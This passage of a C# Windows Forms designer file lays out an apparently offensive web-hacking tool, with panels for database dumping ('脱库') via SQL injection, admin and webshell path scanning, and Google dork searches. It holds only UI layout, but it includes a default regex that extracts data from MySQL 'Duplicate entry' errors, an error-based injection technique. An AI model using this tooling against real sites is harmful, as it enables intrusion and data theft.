            this.cbb_DataOutEncoding.TabIndex = 30;
            this.cbb_DataOutEncoding.Text = "UTF-8(国际编码)";
            // 
            // btn_dataOutputMul
            // 
            this.btn_dataOutputMul.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.btn_dataOutputMul.ForeColor = System.Drawing.SystemColors.ControlText;
            this.btn_dataOutputMul.Image = ((System.Drawing.Image)(resources.GetObject("btn_dataOutputMul.Image")));
            this.btn_dataOutputMul.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.btn_dataOutputMul.Location = new System.Drawing.Point(627, 74);
            this.btn_dataOutputMul.Name = "btn_dataOutputMul";
            this.btn_dataOutputMul.Size = new System.Drawing.Size(96, 51);
            this.btn_dataOutputMul.TabIndex = 45;
            this.btn_dataOutputMul.Text = "脱库-多线程";
            this.btn_dataOutputMul.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.btn_dataOutputMul.UseVisualStyleBackColor = true;
            this.btn_dataOutputMul.Click += new System.EventHandler(this.btn_dataOutputMul_Click);
            // 
            // lbl_threads
            // 
            this.lbl_threads.AutoSize = true;
            this.lbl_threads.BackColor = System.Drawing.Color.Transparent;
            this.lbl_threads.Location = new System.Drawing.Point(521, 79);
            this.lbl_threads.Name = "lbl_threads";
            this.lbl_threads.Size = new System.Drawing.Size(47, 12);
            this.lbl_threads.TabIndex = 43;
            this.lbl_threads.Text = "线程数:";
            // 
            // label17
            // 
            this.label17.AutoSize = true;
            this.label17.BackColor = System.Drawing.Color.Transparent;
            this.label17.ForeColor = System.Drawing.SystemColors.ControlText;
            this.label17.Location = new System.Drawing.Point(427, 79);
            this.label17.Name = "label17";
            this.label17.Size = new System.Drawing.Size(29, 12);
            this.label17.TabIndex = 41;
            this.label17.Text = "Max:";
            // 
            // label18
            // 
            this.label18.AutoSize = true;
            this.label18.BackColor = System.Drawing.Color.Transparent;
            this.label18.ForeColor = System.Drawing.SystemColors.ControlText;
            this.label18.Location = new System.Drawing.Point(330, 79);
            this.label18.Name = "label18";
            this.label18.Size = new System.Drawing.Size(29, 12);
            this.label18.TabIndex = 40;
            this.label18.Text = "Min:";
            // 
            // label19
            // 
            this.label19.AutoSize = true;
            this.label19.BackColor = System.Drawing.Color.Transparent;
            this.label19.ForeColor = System.Drawing.SystemColors.ControlText;
            this.label19.Location = new System.Drawing.Point(6, 107);
            this.label19.Name = "label19";
            this.label19.Size = new System.Drawing.Size(53, 12);
            this.label19.TabIndex = 39;
            this.label19.Text = "截取数据";
            // 
            // chk_DataOutputSetting
            // 
            this.chk_DataOutputSetting.AutoSize = true;
            this.chk_DataOutputSetting.BackColor = System.Drawing.Color.Transparent;
            this.chk_DataOutputSetting.ForeColor = System.Drawing.SystemColors.ControlText;
            this.chk_DataOutputSetting.Location = new System.Drawing.Point(0, 0);
            this.chk_DataOutputSetting.Name = "chk_DataOutputSetting";
            this.chk_DataOutputSetting.Size = new System.Drawing.Size(48, 16);
            this.chk_DataOutputSetting.TabIndex = 35;
            this.chk_DataOutputSetting.Text = "设置";
            this.chk_DataOutputSetting.UseVisualStyleBackColor = false;
            this.chk_DataOutputSetting.CheckedChanged += new System.EventHandler(this.chk_DataOutputSetting_CheckedChanged);
            // 
            // lbl_dataOutEndStr
            // 
            this.lbl_dataOutEndStr.AutoSize = true;
            this.lbl_dataOutEndStr.BackColor = System.Drawing.Color.Transparent;
            this.lbl_dataOutEndStr.ForeColor = System.Drawing.SystemColors.ControlText;
            this.lbl_dataOutEndStr.Location = new System.Drawing.Point(330, 107);
            this.lbl_dataOutEndStr.Name = "lbl_dataOutEndStr";
            this.lbl_dataOutEndStr.Size = new System.Drawing.Size(35, 12);
            this.lbl_dataOutEndStr.TabIndex = 34;
            this.lbl_dataOutEndStr.Text = "结束:";
            // 
            // lbl_dataOutStrStart
            // 
            this.lbl_dataOutStrStart.AutoSize = true;
            this.lbl_dataOutStrStart.BackColor = System.Drawing.Color.Transparent;
            this.lbl_dataOutStrStart.ForeColor = System.Drawing.SystemColors.ControlText;
            this.lbl_dataOutStrStart.Location = new System.Drawing.Point(124, 107);
            this.lbl_dataOutStrStart.Name = "lbl_dataOutStrStart";
            this.lbl_dataOutStrStart.Size = new System.Drawing.Size(35, 12);
            this.lbl_dataOutStrStart.TabIndex = 33;
            this.lbl_dataOutStrStart.Text = "起始:";
            // 
            // button4
            // 
            this.button4.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.button4.ForeColor = System.Drawing.SystemColors.ControlText;
            this.button4.Image = ((System.Drawing.Image)(resources.GetObject("button4.Image")));
            this.button4.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.button4.Location = new System.Drawing.Point(907, 74);
            this.button4.Name = "button4";
            this.button4.Size = new System.Drawing.Size(58, 51);
            this.button4.TabIndex = 25;
            this.button4.Text = "用法";
            this.button4.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.button4.UseVisualStyleBackColor = true;
            this.button4.Click += new System.EventHandler(this.button4_Click_1);
            // 
            // label23
            // 
            this.label23.AutoSize = true;
            this.label23.BackColor = System.Drawing.Color.Transparent;
            this.label23.ForeColor = System.Drawing.SystemColors.ControlText;
            this.label23.Location = new System.Drawing.Point(0, 50);
            this.label23.Name = "label23";
            this.label23.Size = new System.Drawing.Size(53, 12);
            this.label23.TabIndex = 23;
            this.label23.Text = "脱库Exp:";
            // 
            // btn_DataOutput
            // 
            this.btn_DataOutput.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.btn_DataOutput.ForeColor = System.Drawing.SystemColors.ControlText;
            this.btn_DataOutput.Image = ((System.Drawing.Image)(resources.GetObject("btn_DataOutput.Image")));
            this.btn_DataOutput.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.btn_DataOutput.Location = new System.Drawing.Point(733, 74);
            this.btn_DataOutput.Name = "btn_DataOutput";
            this.btn_DataOutput.Size = new System.Drawing.Size(96, 51);
            this.btn_DataOutput.TabIndex = 24;
            this.btn_DataOutput.Text = "脱库-单线程";
            this.btn_DataOutput.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.btn_DataOutput.UseVisualStyleBackColor = true;
            this.btn_DataOutput.Click += new System.EventHandler(this.btn_DataOutput_Click);
            // 
            // btn_OutDataStop
            // 
            this.btn_OutDataStop.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.btn_OutDataStop.Enabled = false;
            this.btn_OutDataStop.ForeColor = System.Drawing.SystemColors.ControlText;
            this.btn_OutDataStop.Image = ((System.Drawing.Image)(resources.GetObject("btn_OutDataStop.Image")));
            this.btn_OutDataStop.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.btn_OutDataStop.Location = new System.Drawing.Point(839, 74);
            this.btn_OutDataStop.Name = "btn_OutDataStop";
            this.btn_OutDataStop.Size = new System.Drawing.Size(58, 51);
            this.btn_OutDataStop.TabIndex = 26;
            this.btn_OutDataStop.Text = "停止";
            this.btn_OutDataStop.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.btn_OutDataStop.UseVisualStyleBackColor = true;
            this.btn_OutDataStop.Click += new System.EventHandler(this.btn_OutDataStop_Click);
            // 
            // txt_dataOutRegex
            // 
            this.txt_dataOutRegex.Location = new System.Drawing.Point(160, 103);
            this.txt_dataOutRegex.Name = "txt_dataOutRegex";
            this.txt_dataOutRegex.Size = new System.Drawing.Size(355, 21);
            this.txt_dataOutRegex.TabIndex = 89;
            this.txt_dataOutRegex.Text = "Duplicate entry \'(?<k8result>.*?)\' for key \'group_key\'";
            // 
            // lbl_dataOutRexex
            // 
            this.lbl_dataOutRexex.AutoSize = true;
            this.lbl_dataOutRexex.BackColor = System.Drawing.Color.Transparent;
            this.lbl_dataOutRexex.ForeColor = System.Drawing.SystemColors.ControlText;
            this.lbl_dataOutRexex.Location = new System.Drawing.Point(115, 107);
            this.lbl_dataOutRexex.Name = "lbl_dataOutRexex";
            this.lbl_dataOutRexex.Size = new System.Drawing.Size(47, 12);
            this.lbl_dataOutRexex.TabIndex = 34;
            this.lbl_dataOutRexex.Text = "表达式:";
            // 
            // txt_resultDataOut
            // 
            this.txt_resultDataOut.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
                        | System.Windows.Forms.AnchorStyles.Left)
                        | System.Windows.Forms.AnchorStyles.Right)));
            this.txt_resultDataOut.BackColor = System.Drawing.SystemColors.Window;
            this.txt_resultDataOut.ForeColor = System.Drawing.SystemColors.WindowText;
            this.txt_resultDataOut.Location = new System.Drawing.Point(3, 140);
            this.txt_resultDataOut.MaxLength = 2147483647;
            this.txt_resultDataOut.Multiline = true;
            this.txt_resultDataOut.Name = "txt_resultDataOut";
            this.txt_resultDataOut.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.txt_resultDataOut.Size = new System.Drawing.Size(974, 465);
            this.txt_resultDataOut.TabIndex = 21;
            // 
            // tab_ScanAdmin
            // 
            this.tab_ScanAdmin.Controls.Add(this.LV_ScanAdmin);
            this.tab_ScanAdmin.Controls.Add(this.txt_ScanAdminURL);
            this.tab_ScanAdmin.Controls.Add(this.pictureBox1);
            this.tab_ScanAdmin.Controls.Add(this.label33);
            this.tab_ScanAdmin.Controls.Add(this.txt_ThreadsScanAdmin);
            this.tab_ScanAdmin.Controls.Add(this.label31);
            this.tab_ScanAdmin.Controls.Add(this.rb_ASPX);
            this.tab_ScanAdmin.Controls.Add(this.rb_Shell);
            this.tab_ScanAdmin.Controls.Add(this.rb_UPfile);
            this.tab_ScanAdmin.Controls.Add(this.rb_4P);
            this.tab_ScanAdmin.Controls.Add(this.rb_dir);
            this.tab_ScanAdmin.Controls.Add(this.rb_backup);
            this.tab_ScanAdmin.Controls.Add(this.rb_DataBase);
            this.tab_ScanAdmin.Controls.Add(this.rb_CGI);
            this.tab_ScanAdmin.Controls.Add(this.rb_JSP);
            this.tab_ScanAdmin.Controls.Add(this.rb_PHP);
            this.tab_ScanAdmin.Controls.Add(this.rb_ASP);
            this.tab_ScanAdmin.Controls.Add(this.rb_ALL);
            this.tab_ScanAdmin.Controls.Add(this.lbl_ScanAdminResult);
            this.tab_ScanAdmin.Controls.Add(this.txt_ScanAdminResult);
            this.tab_ScanAdmin.Controls.Add(this.btn_StopScanAdmin);
            this.tab_ScanAdmin.Controls.Add(this.btn_MoreThreadScanAdmin);
            this.tab_ScanAdmin.Controls.Add(this.btn_ClearScanAdmin);
            this.tab_ScanAdmin.Controls.Add(this.btn_SingleScanAdmin);
            this.tab_ScanAdmin.ImageIndex = 88;
            this.tab_ScanAdmin.Location = new System.Drawing.Point(4, 4);
            this.tab_ScanAdmin.Name = "tab_ScanAdmin";
            this.tab_ScanAdmin.Size = new System.Drawing.Size(980, 623);
            this.tab_ScanAdmin.TabIndex = 13;
            this.tab_ScanAdmin.Text = "ScanAdmin";
            this.tab_ScanAdmin.UseVisualStyleBackColor = true;
            // 
            // LV_ScanAdmin
            // 
            this.LV_ScanAdmin.AccessibleRole = System.Windows.Forms.AccessibleRole.None;
            this.LV_ScanAdmin.ContextMenuStrip = this.rm_ScanAdmin;
            this.LV_ScanAdmin.FullRowSelect = true;
            this.LV_ScanAdmin.Location = new System.Drawing.Point(8, 95);
            this.LV_ScanAdmin.Name = "LV_ScanAdmin";
            this.LV_ScanAdmin.Size = new System.Drawing.Size(962, 408);
            this.LV_ScanAdmin.TabIndex = 15;
            this.LV_ScanAdmin.UseCompatibleStateImageBehavior = false;
            // 
            // rm_ScanAdmin
            // 
            this.rm_ScanAdmin.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.用Firefox打开ToolStripMenuItem1,
            this.用Chrome打开ToolStripMenuItem1,
            this.用微软IE打开ToolStripMenuItem1});
            this.rm_ScanAdmin.Name = "contextMenuStrip1";
            this.rm_ScanAdmin.Size = new System.Drawing.Size(167, 70);
            // 
            // 用Firefox打开ToolStripMenuItem1
            // 
            this.用Firefox打开ToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("用Firefox打开ToolStripMenuItem1.Image")));
            this.用Firefox打开ToolStripMenuItem1.Name = "用Firefox打开ToolStripMenuItem1";
            this.用Firefox打开ToolStripMenuItem1.Size = new System.Drawing.Size(166, 22);
            this.用Firefox打开ToolStripMenuItem1.Text = "用Firefox-->打开";
            this.用Firefox打开ToolStripMenuItem1.Click += new System.EventHandler(this.用Firefox打开ToolStripMenuItem1_Click_1);
            // 
            // 用Chrome打开ToolStripMenuItem1
            // 
            this.用Chrome打开ToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("用Chrome打开ToolStripMenuItem1.Image")));
            this.用Chrome打开ToolStripMenuItem1.Name = "用Chrome打开ToolStripMenuItem1";
            this.用Chrome打开ToolStripMenuItem1.Size = new System.Drawing.Size(166, 22);
            this.用Chrome打开ToolStripMenuItem1.Text = "用Chrome->打开";
            this.用Chrome打开ToolStripMenuItem1.Click += new System.EventHandler(this.用Chrome打开ToolStripMenuItem1_Click_1);
            // 
            // 用微软IE打开ToolStripMenuItem1
            // 
            this.用微软IE打开ToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("用微软IE打开ToolStripMenuItem1.Image")));
            this.用微软IE打开ToolStripMenuItem1.Name = "用微软IE打开ToolStripMenuItem1";
            this.用微软IE打开ToolStripMenuItem1.Size = new System.Drawing.Size(166, 22);
            this.用微软IE打开ToolStripMenuItem1.Text = "用微软IE -->打开";
            this.用微软IE打开ToolStripMenuItem1.Click += new System.EventHandler(this.用微软IE打开ToolStripMenuItem1_Click_1);
            // 
            // txt_ScanAdminURL
            // 
            this.txt_ScanAdminURL.Location = new System.Drawing.Point(64, 8);
            this.txt_ScanAdminURL.Name = "txt_ScanAdminURL";
            this.txt_ScanAdminURL.Size = new System.Drawing.Size(305, 21);
            this.txt_ScanAdminURL.TabIndex = 55;
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
            this.pictureBox1.Location = new System.Drawing.Point(8, 9);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(16, 16);
            this.pictureBox1.TabIndex = 85;
            this.pictureBox1.TabStop = false;
            // 
            // label33
            // 
            this.label33.AutoSize = true;
            this.label33.Location = new System.Drawing.Point(29, 11);
            this.label33.Name = "label33";
            this.label33.Size = new System.Drawing.Size(41, 12);
            this.label33.TabIndex = 84;
            this.label33.Text = "网址：";
            // 
            // txt_ThreadsScanAdmin
            // 
            this.txt_ThreadsScanAdmin.Font = new System.Drawing.Font("SimSun", 9F);
            this.txt_ThreadsScanAdmin.Location = new System.Drawing.Point(653, 10);
            this.txt_ThreadsScanAdmin.Name = "txt_ThreadsScanAdmin";
            this.txt_ThreadsScanAdmin.Size = new System.Drawing.Size(44, 21);
            this.txt_ThreadsScanAdmin.TabIndex = 56;
            this.txt_ThreadsScanAdmin.Text = "50";
            this.txt_ThreadsScanAdmin.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // label31
            // 
            this.label31.AutoSize = true;
            this.label31.BackColor = System.Drawing.Color.Transparent;
            this.label31.Location = new System.Drawing.Point(599, 13);
            this.label31.Name = "label31";
            this.label31.Size = new System.Drawing.Size(47, 12);
            this.label31.TabIndex = 57;
            this.label31.Text = "线程数:";
            // 
            // rb_ASPX
            // 
            this.rb_ASPX.AutoSize = true;
            this.rb_ASPX.Location = new System.Drawing.Point(300, 46);
            this.rb_ASPX.Name = "rb_ASPX";
            this.rb_ASPX.Size = new System.Drawing.Size(47, 16);
            this.rb_ASPX.TabIndex = 40;
            this.rb_ASPX.Text = "ASPX";
            this.rb_ASPX.UseVisualStyleBackColor = true;
            // 
            // rb_Shell
            // 
            this.rb_Shell.AutoSize = true;
            this.rb_Shell.Location = new System.Drawing.Point(300, 68);
            this.rb_Shell.Name = "rb_Shell";
            this.rb_Shell.Size = new System.Drawing.Size(53, 16);
            this.rb_Shell.TabIndex = 41;
            this.rb_Shell.Text = "Shell";
            this.rb_Shell.UseVisualStyleBackColor = true;
            // 
            // rb_UPfile
            // 
            this.rb_UPfile.AutoSize = true;
            this.rb_UPfile.Location = new System.Drawing.Point(241, 68);
            this.rb_UPfile.Name = "rb_UPfile";
            this.rb_UPfile.Size = new System.Drawing.Size(35, 16);
            this.rb_UPfile.TabIndex = 42;
            this.rb_UPfile.Text = "UP";
            this.rb_UPfile.UseVisualStyleBackColor = true;
            // 
            // rb_4P
            // 
            this.rb_4P.AutoSize = true;
            this.rb_4P.Location = new System.Drawing.Point(184, 68);
            this.rb_4P.Name = "rb_4P";
            this.rb_4P.Size = new System.Drawing.Size(35, 16);
            this.rb_4P.TabIndex = 43;
            this.rb_4P.Text = "4P";
            this.rb_4P.UseVisualStyleBackColor = true;
            // 
            // rb_dir
            // 
            this.rb_dir.AutoSize = true;
            this.rb_dir.Location = new System.Drawing.Point(124, 68);
            this.rb_dir.Name = "rb_dir";
            this.rb_dir.Size = new System.Drawing.Size(41, 16);
            this.rb_dir.TabIndex = 44;
            this.rb_dir.Text = "DIR";
            this.rb_dir.UseVisualStyleBackColor = true;
            // 
            // rb_backup
            // 
            this.rb_backup.AutoSize = true;
            this.rb_backup.Location = new System.Drawing.Point(64, 68);
            this.rb_backup.Name = "rb_backup";
            this.rb_backup.Size = new System.Drawing.Size(41, 16);
            this.rb_backup.TabIndex = 45;
            this.rb_backup.Text = "RAR";
            this.rb_backup.UseVisualStyleBackColor = true;
            // 
            // rb_DataBase
            // 
            this.rb_DataBase.AutoSize = true;
            this.rb_DataBase.Location = new System.Drawing.Point(8, 68);
            this.rb_DataBase.Name = "rb_DataBase";
            this.rb_DataBase.Size = new System.Drawing.Size(47, 16);
            this.rb_DataBase.TabIndex = 46;
            this.rb_DataBase.Text = "Data";
            this.rb_DataBase.UseVisualStyleBackColor = true;
            // 
            // rb_CGI
            // 
            this.rb_CGI.AutoSize = true;
            this.rb_CGI.Location = new System.Drawing.Point(241, 46);
            this.rb_CGI.Name = "rb_CGI";
            this.rb_CGI.Size = new System.Drawing.Size(41, 16);
            this.rb_CGI.TabIndex = 47;
            this.rb_CGI.Text = "CGI";
            this.rb_CGI.UseVisualStyleBackColor = true;
            // 
            // rb_JSP
            // 
            this.rb_JSP.AutoSize = true;
            this.rb_JSP.Location = new System.Drawing.Point(184, 46);
            this.rb_JSP.Name = "rb_JSP";
            this.rb_JSP.Size = new System.Drawing.Size(41, 16);
            this.rb_JSP.TabIndex = 48;
            this.rb_JSP.Text = "JSP";
            this.rb_JSP.UseVisualStyleBackColor = true;
            // 
            // rb_PHP
            // 
            this.rb_PHP.AutoSize = true;
            this.rb_PHP.Checked = true;
            this.rb_PHP.Location = new System.Drawing.Point(124, 46);
            this.rb_PHP.Name = "rb_PHP";
            this.rb_PHP.Size = new System.Drawing.Size(41, 16);
            this.rb_PHP.TabIndex = 49;
            this.rb_PHP.TabStop = true;
            this.rb_PHP.Text = "PHP";
            this.rb_PHP.UseVisualStyleBackColor = true;
            // 
            // rb_ASP
            // 
            this.rb_ASP.AutoSize = true;
            this.rb_ASP.Location = new System.Drawing.Point(64, 46);
            this.rb_ASP.Name = "rb_ASP";
            this.rb_ASP.Size = new System.Drawing.Size(41, 16);
            this.rb_ASP.TabIndex = 50;
            this.rb_ASP.Text = "ASP";
            this.rb_ASP.UseVisualStyleBackColor = true;
            // 
            // rb_ALL
            // 
            this.rb_ALL.AutoSize = true;
            this.rb_ALL.Location = new System.Drawing.Point(8, 47);
            this.rb_ALL.Name = "rb_ALL";
            this.rb_ALL.Size = new System.Drawing.Size(41, 16);
            this.rb_ALL.TabIndex = 51;
            this.rb_ALL.Text = "ALL";
            this.rb_ALL.UseVisualStyleBackColor = true;
            // 
            // lbl_ScanAdminResult
            // 
            this.lbl_ScanAdminResult.AutoSize = true;
            this.lbl_ScanAdminResult.BackColor = System.Drawing.Color.Transparent;
            this.lbl_ScanAdminResult.Location = new System.Drawing.Point(6, 506);
            this.lbl_ScanAdminResult.Name = "lbl_ScanAdminResult";
            this.lbl_ScanAdminResult.Size = new System.Drawing.Size(53, 12);
            this.lbl_ScanAdminResult.TabIndex = 32;
            this.lbl_ScanAdminResult.Text = "扫描速度";
            // 
            // txt_ScanAdminResult
            // 
            this.txt_ScanAdminResult.Location = new System.Drawing.Point(8, 521);
            this.txt_ScanAdminResult.Multiline = true;
            this.txt_ScanAdminResult.Name = "txt_ScanAdminResult";
            this.txt_ScanAdminResult.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.txt_ScanAdminResult.Size = new System.Drawing.Size(962, 94);
            this.txt_ScanAdminResult.TabIndex = 31;
            // 
            // btn_StopScanAdmin
            // 
            this.btn_StopScanAdmin.Enabled = false;
            this.btn_StopScanAdmin.Image = ((System.Drawing.Image)(resources.GetObject("btn_StopScanAdmin.Image")));
            this.btn_StopScanAdmin.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.btn_StopScanAdmin.Location = new System.Drawing.Point(839, 42);
            this.btn_StopScanAdmin.Name = "btn_StopScanAdmin";
            this.btn_StopScanAdmin.Size = new System.Drawing.Size(54, 42);
            this.btn_StopScanAdmin.TabIndex = 18;
            this.btn_StopScanAdmin.Text = "停止";
            this.btn_StopScanAdmin.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.btn_StopScanAdmin.UseVisualStyleBackColor = true;
            this.btn_StopScanAdmin.Click += new System.EventHandler(this.btn_StopScanAdmin_Click);
            // 
            // btn_MoreThreadScanAdmin
            // 
            this.btn_MoreThreadScanAdmin.Image = ((System.Drawing.Image)(resources.GetObject("btn_MoreThreadScanAdmin.Image")));
            this.btn_MoreThreadScanAdmin.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.btn_MoreThreadScanAdmin.Location = new System.Drawing.Point(601, 42);
            this.btn_MoreThreadScanAdmin.Name = "btn_MoreThreadScanAdmin";
            this.btn_MoreThreadScanAdmin.Size = new System.Drawing.Size(96, 42);
            this.btn_MoreThreadScanAdmin.TabIndex = 16;
            this.btn_MoreThreadScanAdmin.Text = "扫描-多线程";
            this.btn_MoreThreadScanAdmin.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.btn_MoreThreadScanAdmin.UseVisualStyleBackColor = true;
            this.btn_MoreThreadScanAdmin.Click += new System.EventHandler(this.btn_MoreThreadScanAdmin_Click);
            // 
            // btn_ClearScanAdmin
            // 
            this.btn_ClearScanAdmin.Image = ((System.Drawing.Image)(resources.GetObject("btn_ClearScanAdmin.Image")));
            this.btn_ClearScanAdmin.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.btn_ClearScanAdmin.Location = new System.Drawing.Point(916, 42);
            this.btn_ClearScanAdmin.Name = "btn_ClearScanAdmin";
            this.btn_ClearScanAdmin.Size = new System.Drawing.Size(54, 42);
            this.btn_ClearScanAdmin.TabIndex = 13;
            this.btn_ClearScanAdmin.Text = "清空";
            this.btn_ClearScanAdmin.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.btn_ClearScanAdmin.UseVisualStyleBackColor = true;
            this.btn_ClearScanAdmin.Click += new System.EventHandler(this.btn_ClearScanAdmin_Click);
            // 
            // btn_SingleScanAdmin
            // 
            this.btn_SingleScanAdmin.Image = ((System.Drawing.Image)(resources.GetObject("btn_SingleScanAdmin.Image")));
            this.btn_SingleScanAdmin.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.btn_SingleScanAdmin.Location = new System.Drawing.Point(720, 42);
            this.btn_SingleScanAdmin.Name = "btn_SingleScanAdmin";
            this.btn_SingleScanAdmin.Size = new System.Drawing.Size(96, 42);
            this.btn_SingleScanAdmin.TabIndex = 14;
            this.btn_SingleScanAdmin.Text = "扫描-单线程";
            this.btn_SingleScanAdmin.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.btn_SingleScanAdmin.UseVisualStyleBackColor = true;
            this.btn_SingleScanAdmin.Click += new System.EventHandler(this.btn_SingleScanAdmin_Click);
            // 
            // tab_googleHackDB
            // 
            this.tab_googleHackDB.Controls.Add(this.groupBox1);
            this.tab_googleHackDB.ImageIndex = 49;
            this.tab_googleHackDB.Location = new System.Drawing.Point(4, 4);
            this.tab_googleHackDB.Name = "tab_googleHackDB";
            this.tab_googleHackDB.Size = new System.Drawing.Size(980, 623);
            this.tab_googleHackDB.TabIndex = 11;
            this.tab_googleHackDB.Text = "GoogleHack";
            this.tab_googleHackDB.UseVisualStyleBackColor = true;
            // 
            // groupBox1
            // 
            this.groupBox1.Controls.Add(this.label30);
            this.groupBox1.Controls.Add(this.btn_ghdb_Search);
            this.groupBox1.Controls.Add(this.txt_ghdb_search_text);
            this.groupBox1.Controls.Add(this.label29);
            this.groupBox1.Controls.Add(this.label28);
            this.groupBox1.Controls.Add(this.cbb_ghdb_earchCat);
            this.groupBox1.Location = new System.Drawing.Point(3, 8);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(1049, 97);
            this.groupBox1.TabIndex = 0;
            this.groupBox1.TabStop = false;
            // 
            // label30
            // 
            this.label30.AutoSize = true;
            this.label30.Font = new System.Drawing.Font("SimSun", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
            this.label30.Location = new System.Drawing.Point(390, 17);
            this.label30.Name = "label30";
            this.label30.Size = new System.Drawing.Size(219, 21);
            this.label30.TabIndex = 5;
            this.label30.Text = "Search Google Dorks";
            // 
            // btn_ghdb_Search
            // 
            this.btn_ghdb_Search.Location = new System.Drawing.Point(755, 56);
            this.btn_ghdb_Search.Name = "btn_ghdb_Search";
            this.btn_ghdb_Search.Size = new System.Drawing.Size(75, 23);
            this.btn_ghdb_Search.TabIndex = 4;
            this.btn_ghdb_Search.Text = "Search";
            this.btn_ghdb_Search.UseVisualStyleBackColor = true;
            // 
            // txt_ghdb_search_text
            // 
            this.txt_ghdb_search_text.Location = new System.Drawing.Point(587, 55);
            this.txt_ghdb_search_text.Name = "txt_ghdb_search_text";
            this.txt_ghdb_search_text.Size = new System.Drawing.Size(137, 21);
            this.txt_ghdb_search_text.TabIndex = 3;
            // 
            // label29
            // 
            this.label29.AutoSize = true;
            this.label29.Location = new System.Drawing.Point(462, 59);
            this.label29.Name = "label29";
            this.label29.Size = new System.Drawing.Size(107, 12);
            this.label29.TabIndex = 2;
            this.label29.Text = "Free text search:";
            // 
            // label28
            // 
            this.label28.AutoSize = true;
            this.label28.Location = new System.Drawing.Point(119, 59);
            this.label28.Name = "label28";
            this.label28.Size = new System.Drawing.Size(59, 12);
            this.label28.TabIndex = 1;
            this.label28.Text = "Category:";
            // 
            // cbb_ghdb_earchCat
            // 
            this.cbb_ghdb_earchCat.FormattingEnabled = true;
            this.cbb_ghdb_earchCat.Items.AddRange(new object[] {
            "All",
            "Footholds",
            "Files containing usernames",
            "Sensitive Directories",
            "Web Server Detection",
            "Vulnerable Files",
            "Vulnerable Servers",
            "Error Messages",
            "Files containing juicy info",
            "Files containing passwords",
            "Sensitive Online Shopping Info",
            "Network or vulnerability data",
            "Pages containing login portals",
            "Various Online Devices",
            "Advisories and Vulnerabilities"});
            this.cbb_ghdb_earchCat.Location = new System.Drawing.Point(195, 56);
            this.cbb_ghdb_earchCat.Name = "cbb_ghdb_earchCat";
            this.cbb_ghdb_earchCat.Size = new System.Drawing.Size(248, 20);
            this.cbb_ghdb_earchCat.TabIndex = 0;
            this.cbb_ghdb_earchCat.Text = "ALL";
            // 
            // tab_notepad
            // 
            this.tab_notepad.Controls.Add(this.comboBox1);
            this.tab_notepad.Controls.Add(this.button6);
            this.tab_notepad.Controls.Add(this.richTextBox1);
            this.tab_notepad.Controls.Add(this.treeView1);
            this.tab_notepad.ImageIndex = 14;
            this.tab_notepad.Location = new System.Drawing.Point(4, 4);
            this.tab_notepad.Name = "tab_notepad";
            this.tab_notepad.Size = new System.Drawing.Size(980, 623);
            this.tab_notepad.TabIndex = 10;
            this.tab_notepad.Text = "Notepad";
            this.tab_notepad.UseVisualStyleBackColor = true;
            // 
            // comboBox1
            // 
            this.comboBox1.FormattingEnabled = true;
            this.comboBox1.Location = new System.Drawing.Point(412, 18);
            this.comboBox1.Name = "comboBox1";
            this.comboBox1.Size = new System.Drawing.Size(304, 20);
            this.comboBox1.TabIndex = 4;
            // 
            // button6
            // 
            this.button6.Location = new System.Drawing.Point(722, 15);
            this.button6.Name = "button6";
            this.button6.Size = new System.Drawing.Size(84, 23);
            this.button6.TabIndex = 3;
            this.button6.Text = "button6";
            this.button6.UseVisualStyleBackColor = true;
            // 
            // richTextBox1
            // 
            this.richTextBox1.Location = new System.Drawing.Point(237, 61);
            this.richTextBox1.Name = "richTextBox1";
            this.richTextBox1.Size = new System.Drawing.Size(740, 551);
            this.richTextBox1.TabIndex = 1;
            this.richTextBox1.Text = "";
            // 
            // treeView1
            // 
            this.treeView1.Location = new System.Drawing.Point(3, 3);
            this.treeView1.Name = "treeView1";
            this.treeView1.Size = new System.Drawing.Size(228, 609);
            this.treeView1.TabIndex = 0;
            // 
            // tab_XssAnalysis
            // 
            this.tab_XssAnalysis.Controls.Add(this.label26);
            this.tab_XssAnalysis.Controls.Add(this.gb_xssAnalysis);
            this.tab_XssAnalysis.ImageIndex = 89;
